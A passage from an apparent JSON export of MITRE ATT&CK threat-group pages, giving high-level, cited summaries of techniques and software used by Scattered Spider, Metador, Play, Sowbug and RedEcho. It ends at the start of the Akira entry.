Spider used IAM manipulation to gain persistence and to assume or elevate privileges.[5] Scattered Spider has also assigned user access admin roles in order to gain Tenant Root Group management permissions in Azure.[2] During C0027, Scattered Spider used IAM manipulation to gain persistence and to assume or elevate privileges.[5] .005 Account Manipulation: Device Registration During C0027, Scattered Spider registered devices for MFA to maintain persistence through victims' VPN.[5] Enterprise T1217 Browser Information Discovery Scattered Spider retrieves browser histories via infostealer malware such as Raccoon Stealer.[3] Enterprise T1580 Cloud Infrastructure Discovery Scattered Spider enumerates cloud environments to identify server and backup management infrastructure, resource access, databases and storage containers.[2] Enterprise T1538 Cloud Service Dashboard Scattered Spider abused AWS Systems Manager Inventory to identify targets on the compromised network prior to lateral movement.[3] Enterprise T1136 Create Account Scattered Spider creates new user identities within the compromised organization.[3] Enterprise T1486 Data Encrypted for Impact Scattered Spider has used BlackCat ransomware to encrypt files on VMWare ESXi servers.[3][2] Enterprise T1530 Data from Cloud Storage Scattered Spider enumerates data stored in cloud resources for collection and exfiltration purposes.[3] During C0027, Scattered Spider accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.[5] Enterprise T1213 .002 Data from Information Repositories: Sharepoint During C0027, Scattered Spider accessed victim SharePoint environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.[5] .003 Data from Information Repositories: Code Repositories Scattered Spider enumerates data stored within victim code repositories, such as internal GitHub repositories.[3][2] .005 Data from Information Repositories: Messaging Applications Scattered Spider threat actors search the victim\u2019s Slack and Microsoft Teams for conversations about the intrusion and incident response.[3] Enterprise T1074 Data Staged Scattered Spider stages data in a centralized database prior to exfiltration.[3] Enterprise T1006 Direct Volume Access Scattered Spider has created volume shadow copies of virtual domain controller disks to extract the NTDS.dit file.[2] Enterprise T1484 .002 Domain or Tenant Policy Modification: Trust Modification Scattered Spider adds a federated identity provider to the victim\u2019s SSO tenant and activates automatic account linking.[3] Enterprise T1114 Email Collection Scattered Spider searched the victim\u2019s Microsoft Exchange for emails about the intrusion and incident response.[3] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Scattered Spider has exfiltrated victim data to the MEGA file sharing site.[3][2] Enterprise T1190 Exploit Public-Facing Application During C0027, Scattered Spider exploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access.[5] Enterprise T1068 Exploitation for Privilege Escalation Scattered Spider has deployed a malicious kernel driver through exploitation of CVE-2015-2291 in the Intel Ethernet diagnostics driver for Windows (iqvw64.sys).[4] Enterprise T1133 External Remote Services Scattered Spider has leveraged legitimate remote management tools to maintain persistent access.[4] During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments.[5] Enterprise T1083 File and Directory Discovery Scattered Spider Spider enumerates a target organization for files and directories of interest, including source code.[3][2] Enterprise T1657 Financial Theft Scattered Spider has deployed ransomware on compromised hosts for financial gain.[3][7] Enterprise T1589 .001 Gather Victim Identity Information: Credentials During C0027, Scattered Spider sent phishing messages via SMS to steal credentials.[5] Enterprise T1564 .008 Hide Artifacts: Email Hiding Rules Scattered Spider creates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products.[2] Enterprise T1656 Impersonation During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.[5] Scattered Spider utilized social engineering to compel IT help desk personnel to reset passwords and MFA tokens.[3][2] During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.[5] Enterprise T1105 Ingress Tool Transfer During C0027, Scattered Spider downloaded tools using victim organization systems.[5] Enterprise T1556 .006 Modify Authentication Process: Multi-Factor Authentication After compromising user accounts, Scattered Spider registers their own MFA tokens.[3] .009 Modify Authentication Process: Conditional Access Policies Scattered Spider has added additional trusted locations to Azure AD conditional access policies. [2] Enterprise T1578 .002 Modify Cloud Compute Infrastructure: Create Cloud Instance During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs.[5] Scattered Spider has also created Amazon EC2 instances within the victim's environment.[3] During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs.[5] Enterprise T1621 Multi-Factor Authentication Request Generation Scattered Spider has used multifactor authentication (MFA) fatigue by sending repeated MFA authentication requests to targets.[4] During C0027, Scattered Spider attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge.[5] Enterprise T1046 Network Service Discovery During C0027, used RustScan to scan for open ports on targeted ESXi appliances.[5] Enterprise T1588 .002 Obtain Capabilities: Tool During C0027, Scattered Spider obtained and used multiple tools including the LINpeas privilege escalation utility, aws_consoler, rsocx reverse proxy, Level RMM tool, and RustScan port scanner.[5] Enterprise T1003 .003 OS Credential Dumping: NTDS Scattered Spider has extracted the NTDS.dit file by creating volume shadow copies of virtual domain controller disks.[2] .006 OS Credential Dumping: DCSync During C0027, Scattered Spider performed domain replication.[5] Enterprise T1069 .003 Permission Groups Discovery: Cloud Groups During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and their Active Directory attributes.[5] Enterprise T1566 .004 Phishing: Spearphishing Voice During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls to direct victims to download a remote monitoring and management (RMM) tool that would allow the adversary to remotely control their system.[5] Enterprise T1598 Phishing for Information Scattered Spider has used a combination of credential phishing and social engineering to capture one-time-password (OTP) codes.[4] .001 Spearphishing Service During C0027, Scattered Spider sent Telegram messages impersonating IT personnel to harvest credentials.[5] .004 Spearphishing Voice During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites.[5] Scattered Spider has also called employees at target organizations and compelled them to navigate to fake login portals using adversary-in-the-middle toolkits.[2] During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites.[5] Enterprise T1572 Protocol Tunneling During C0027, Scattered Spider used SSH tunneling in targeted environments.[5] Enterprise T1090 Proxy During C0027, Scattered Spider installed the open-source rsocx reverse proxy tool on a targeted ESXi appliance.[5] Enterprise T1219 Remote Access Tools During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools.[5] In addition to directing victims to run remote software, Scattered Spider members themselves also deploy RMM software including AnyDesk, LogMeIn, and ConnectWise Control to establish persistence on the compromised network.[3][7] During C0027, Scattered Spider directed victims to run remote monitoring and management (RMM) tools.[5] Enterprise T1021 .007 Remote Services: Cloud Services During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.[5] Scattered Spider has also leveraged pre-existing AWS EC2 instances for lateral movement and data collection purposes.[3] During C0027, Scattered Spider used compromised Azure credentials for credential theft activity and lateral movement to on-premises systems.[5] Enterprise T1018 Remote System Discovery Scattered Spider can enumerate remote systems, such as VMware vCenter infrastructure.[3] Enterprise T1539 Steal Web Session Cookie Scattered Spider retrieves browser cookies via Raccoon Stealer.[3] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Scattered Spider has used self-signed and stolen certificates originally issued to NVIDIA and Global Software LLC.[4] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files Scattered Spider Spider searches for credential storage documentation on a compromised host.[3] .004 Unsecured Credentials: Private Keys Scattered Spider enumerate and exfiltrate code-signing certificates from a compromised host.[3] Enterprise T1204 User Execution Scattered Spider has impersonated organization IT and helpdesk staff to instruct victims to execute commercial remote access tools to gain initial access.[3] Enterprise T1078 .004 Valid Accounts: Cloud Accounts During C0027, Scattered Spider leveraged compromised credentials from victim users to authenticate to Azure tenants.[5] Enterprise T1102 Web Service During C0027, Scattered Spider downloaded tools from sites including file.io, GitHub, and paste.ee.[5] Enterprise T1047 Windows Management Instrumentation During C0027, Scattered Spider used Windows Management Instrumentation (WMI) to move laterally via Impacket.[5] Mobile T1660 Phishing Scattered Spider has sent SMS phishing messages to employee phone numbers with a link to a site configured with a fake credential harvesting login portal.[2] Mobile T1451 SIM Card Swap Scattered Spider has used SIM swapping to maintain persistence on mobile carrier networks and SIM cards.[8] Software ID Name References Techniques S1068 BlackCat Scattered Spider has deployed BlackCat ransomware to victim environments for financial gain.[3][2] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation, Account Discovery: Domain Account, Command and Scripting Interpreter: Windows Command Shell, Data Encrypted for Impact, Defacement: Internal Defacement, Disk Wipe: Disk Content Wipe, File and Directory Discovery, File and Directory Permissions Modification: Windows File and Directory Permissions Modification, Indicator Removal: Clear Windows Event Logs, Inhibit System Recovery, Lateral Tool Transfer, Modify Registry, Network Share Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, Service Stop, System Information Discovery, System Owner/User Discovery, Windows Management Instrumentation S0357 Impacket During C0027, Scattered Spider used Impacket for lateral movement.[5] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0349 LaZagne Scattered Spider can obtain credential information using LaZagne.[2] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S0002 Mimikatz Scattered Spider has gathered credentials using Mimikatz.[3][2] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0508 ngrok Scattered Spider has used ngrok to create secure tunnels to remote web servers.[3] Dynamic Resolution: Domain Generation Algorithms, Exfiltration Over Web Service, Protocol Tunneling, Proxy, Web Service S0670 WarzoneRAT Scattered Spider has utilized WarzoneRAT to remotely access a compromised system.[3] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Component Object Model Hijacking, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts, Hide Artifacts: Hidden Window, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Proxy, Remote Services: Remote Desktop Protocol, Remote Services: VNC, Rootkit, System Information Discovery, Template Injection, User Execution: Malicious File, Video Capture References CrowdStrike. (n.d.). Scattered Spider. Retrieved July 5, 2023. Microsoft. (2023, October 25). Octo Tempest crosses boundaries to facilitate extortion, encryption, and destruction. Retrieved March 18, 2024. CISA. (2023, November 16). Cybersecurity Advisory: Scattered Spider (AA23-320A). Retrieved March 18, 2024. CrowdStrike. (2023, January 10). SCATTERED SPIDER Exploits Windows Security Deficiencies with Bring-Your-Own-Vulnerable-Driver Tactic in Attempt to Bypass Endpoint Security. Retrieved July 5, 2023. Parisi, T. (2022, December 2). Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies. Retrieved June 30, 2023. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Trellix et. al.. (2023, August 17). Scattered Spider: The Modus Operandi. Retrieved March 18, 2024. Mphasis. (2024, April 17). Scattered Spider conducts SIM swapping attacks. Retrieved February 3, 2025. "
},
{
"id": 76,
"title": "Metador, Group G1013",
"path": "/groups/G1013/index.html",
"content": " Metador Metador is a suspected cyber espionage group that was first reported in September 2022. Metador has targeted a limited number of telecommunication companies, internet service providers, and universities in the Middle East and Africa. Security researchers named the group Metador based on the \"I am meta\" string in one of the group's malware samples and the expectation of Spanish-language responses from C2 servers.[1] ID: G1013 Contributors: Massimiliano Romano, BT Security; Sittikorn Sangrattanapitak Version: 1.1 Created: 25 January 2023 Last Modified: 11 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Metador has used HTTP for C2.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Metador has used the Windows command line to execute commands.[1] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription Metador has established persistence through the use of a WMI event subscription combined with unusual living-off-the-land binaries such as cdb.exe.[1] Enterprise T1070 .004 Indicator Removal: File Deletion Metador has quickly deleted cbd.exe from a compromised host following the successful deployment of their malware.[1] Enterprise T1105 Ingress Tool Transfer Metador has downloaded tools and malware onto a compromised system.[1] Enterprise T1095 Non-Application Layer Protocol Metador has used TCP for C2.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Metador has encrypted their payloads.[1] Enterprise T1588 .001 Obtain Capabilities: Malware Metador has used unique malware in their operations, including metaMain and Mafalda.[1] .002 Obtain Capabilities: Tool Metador has used Microsoft's Console Debugger in some of their operations.[1] Software ID Name References Techniques S1060 Mafalda [1][2] Access Token Manipulation: Make and Impersonate Token, Access Token Manipulation, Application Layer Protocol: Web Protocols, Browser Information Discovery, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Data from Local System, Data Staged: Local Data Staging, Debugger Evasion, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, External Remote Services, File and Directory Discovery, Indicator Removal: Clear Windows Event Logs, Ingress Tool Transfer, Input Capture, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, OS Credential Dumping: LSASS Memory, Process Discovery, Proxy: Internal Proxy, Query Registry, Screen Capture, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Traffic Signaling: Port Knocking, Unsecured Credentials: Private Keys S1059 metaMain [1][2] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Custom Method, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Exfiltration Over C2 Channel, File and Directory Discovery, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Process Injection, Proxy: Internal Proxy, Reflective Code Loading, Screen Capture, System Information Discovery, System Owner/User Discovery, Traffic Signaling: Port Knocking, Virtualization/Sandbox Evasion: Time Based Evasion References Ehrlich, A., et al. (2022, September). THE MYSTERY OF METADOR | AN UNATTRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES. Retrieved January 23, 2023. SentinelLabs. (2022, September 22). Metador Technical Appendix. Retrieved April 4, 2023. "
},
{
"id": 77,
"title": "Play, Group G1040",
"path": "/groups/G1040/index.html",
"content": " Play Play is a ransomware group that has been active since at least 2022 deploying Playcrypt ransomware against the business, government, critical infrastructure, healthcare, and media sectors in North America, South America, and Europe. Play actors employ a double-extortion model, encrypting systems after exfiltrating data, and are presumed by security researchers to operate as a closed group.[1][2] ID: G1040 Contributors: Marco Pedrinazzi, @pedrinazziM Version: 1.0 Created: 24 September 2024 Last Modified: 02 October 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1560 .001 Archive Collected Data: Archive via Utility Play has used WinRAR to compress files prior to exfiltration.[1][2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Play has used Base64-encoded PowerShell scripts to disable Microsoft Defender.[2] .003 Command and Scripting Interpreter: Windows Command Shell Play has used a batch script to remove indicators of its presence on compromised hosts.[2] Enterprise T1030 Data Transfer Size Limits Play has split victims' files into chunks for exfiltration.[1][2] Enterprise T1587 .001 Develop Capabilities: Malware Play developed and employ Playcrypt ransomware.[2][1] Enterprise T1048 Exfiltration Over Alternative Protocol Play has used WinSCP to exfiltrate data to actor-controlled accounts.[1][2] Enterprise T1190 Exploit Public-Facing Application Play has exploited known vulnerabilities for initial access including CVE-2018-13379 and CVE-2020-12812 in FortiOS and CVE-2022-41082 and CVE-2022-41040 (\"ProxyNotShell\") in Microsoft Exchange.[1][2] Enterprise T1133 External Remote Services Play has used Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access.[1][2] Enterprise T1083 File and Directory Discovery Play has used the Grixba information stealer to list security files and processes.[2] Enterprise T1657 Financial Theft Play demands ransom payments from victims to unencrypt filesystems and to not publish sensitive data exfiltrated from victim networks.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Play has used tools including GMER, IOBit, and PowerTool to disable antivirus software.[1][2] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs Play has used tools to remove log files on targeted systems.[1][2] .004 Indicator Removal: File Deletion Play has used tools including Wevtutil to remove malicious files from compromised hosts.[2] Enterprise T1105 Ingress Tool Transfer Play has used Cobalt Strike to download files to compromised machines.[2] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation Play has used Base64-encoded PowerShell scripts for post exploit activities on compromised hosts.[2] Enterprise T1588 .002 Obtain Capabilities: Tool Play has used multiple tools for discovery and defense evasion purposes on compromised hosts.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Play has used Mimikatz and the Windows Task Manager to dump LSASS process memory.[2] Enterprise T1057 Process Discovery Play has used the information stealer Grixba to check for a list of security processes.[2] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Play has used Cobalt Strike to move laterally via SMB.[2] Enterprise T1018 Remote System Discovery Play has used tools such as AdFind, Nltest, and BloodHound to enumerate shares and hostnames on compromised networks.[2] Enterprise T1518 .001 Software Discovery: Security Software Discovery Play has used the information-stealing tool Grixba to scan for anti-virus software.[1] Enterprise T1082 System Information Discovery Play has leveraged tools to enumerate system information.[2] Enterprise T1016 System Network Configuration Discovery Play has used the information-stealing tool Grixba to enumerate network information.[1] Enterprise T1078 Valid Accounts Play has used valid VPN accounts to achieve initial access.[1] .002 Domain Accounts Play has used valid domain accounts for access.[2] .003 Local Accounts Play has used valid local accounts to gain initial access.[2] Software ID Name References Techniques S0552 AdFind [1][2] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S0521 BloodHound [2] Account Discovery: Domain Account, Account Discovery: Local Account, Archive Collected Data, Command and Scripting Interpreter: PowerShell, Domain Trust Discovery, Group Policy Discovery, Native API, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote System Discovery, System Owner/User Discovery S0154 Cobalt Strike [2] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0363 Empire [2] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0002 Mimikatz [2] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0359 Nltest [2] Domain Trust Discovery, Remote System Discovery, System Network Configuration Discovery S1162 Playcrypt [1][2] Data Encrypted for Impact, File and Directory Discovery, Inhibit System Recovery S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0645 Wevtutil [2] Data from Local System, Impair Defenses: Disable Windows Event Logging, Indicator Removal: Clear Windows Event Logs References CISA. (2023, December 18). #StopRansomware: Play Ransomware AA23-352A. Retrieved September 24, 2024. Trend Micro Research. (2023, July 21). Ransomware Spotlight: Play. Retrieved September 24, 2024. "
},
{
"id": 78,
"title": "Sowbug, Group G0054",
"path": "/groups/G0054/index.html",
"content": " Sowbug Sowbug is a threat group that has conducted targeted attacks against organizations in South America and Southeast Asia, particularly government entities, since at least 2015. [1] ID: G0054 Contributors: Alan Neville, @abnev Version: 1.1 Created: 16 January 2018 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1560 .001 Archive Collected Data: Archive via Utility Sowbug extracted documents and bundled them into a RAR archive.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Sowbug has used command line during its intrusions.[1] Enterprise T1039 Data from Network Shared Drive Sowbug extracted Word documents from a file server on a victim network.[1] Enterprise T1083 File and Directory Discovery Sowbug identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.[1] Enterprise T1056 .001 Input Capture: Keylogging Sowbug has used keylogging tools.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Sowbug named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\\microsoft\\security.[1] Enterprise T1135 Network Share Discovery Sowbug listed remote shared drives that were accessible from a victim.[1] Enterprise T1003 OS Credential Dumping Sowbug has used credential dumping tools.[1] Enterprise T1082 System Information Discovery Sowbug obtained OS version and hardware configuration from a victim.[1] Software ID Name References Techniques S0171 Felismus [1] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery S0188 Starloader [1] Deobfuscate/Decode Files or Information, Masquerading: Match Legitimate Resource Name or Location References Symantec Security Response. (2017, November 7). Sowbug: Cyber espionage group targets South American and Southeast Asian governments. Retrieved November 16, 2017. "
},
{
"id": 79,
"title": "RedEcho, Group G1042",
"path": "/groups/G1042/index.html",
"content": " RedEcho RedEcho is a People\u2019s Republic of China-related threat actor associated with long-running intrusions in Indian critical infrastructure entities. RedEcho overlaps with various other PRC-linked threat groups, such as APT41, and is linked to ShadowPad malware use through shared infrastructure.[1][2] ID: G1042 Version: 1.0 Created: 21 November 2024 Last Modified: 13 March 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains RedEcho has registered domains spoofing Indian critical infrastructure entities.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols RedEcho network activity is associated with SSL traffic via TCP 443 and proxied HTTP traffic over non-standard ports.[1] Enterprise T1568 Dynamic Resolution RedEcho used dynamic DNS domains associated with malicious infrastructure.[1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography RedEcho uses SSL for network communication.[1] Enterprise T1571 Non-Standard Port RedEcho has used non-standard ports such as TCP 8080 for HTTP communication.[1] Software ID Name References Techniques S0596 ShadowPad RedEcho has used ShadowPad during intrusions.[1][2] Application Layer Protocol: DNS, Application Layer Protocol: File Transfer Protocols, Application Layer Protocol: Web Protocols, Data Encoding: Non-Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Indicator Removal, Ingress Tool Transfer, Modify Registry, Non-Application Layer Protocol, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Scheduled Transfer, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery References Recorded Future Insikt Group. (2021, February). China-Linked Group RedEcho Targets the Indian Power Sector Amid Heightened Border Tensions. Retrieved November 21, 2024. Recorded Future Insikt Group. (2022, April 6). Continued Targeting of Indian Power Grid Assets by Chinese State-Sponsored Activity Group. Retrieved November 21, 2024. "
},
{
"id": 80,
"title": "Akira, GOLD SAHARA, PUNK SPIDER, Howling Scorpius, Group G1024",
"path": "/groups/G1024/index.html",
